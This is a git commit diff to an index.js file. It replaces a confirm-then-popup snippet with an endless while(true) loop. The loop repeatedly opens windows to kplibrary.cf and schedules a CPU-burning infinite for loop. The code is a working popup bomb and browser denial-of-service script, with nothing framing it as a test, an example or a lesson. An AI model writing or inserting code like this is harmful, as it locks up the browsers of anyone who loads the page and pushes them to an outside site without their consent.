87e6328bc317396ee9a4bee049b606ba25dadb64
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 18:17:52 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,11 +1,7 @@
-var answer = confirm ("Im a pineapple")
-if (answer)
-window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
+while(true)
+{
+ window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
 setTimeout(function(){
 for(var i = 0; i === i; i++) {}
-}, 50); 
-else
-window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
-setTimeout(function(){
-for(var i = 0; i === i; i++) {}
-}, 50); 
+}, 50);  
+}
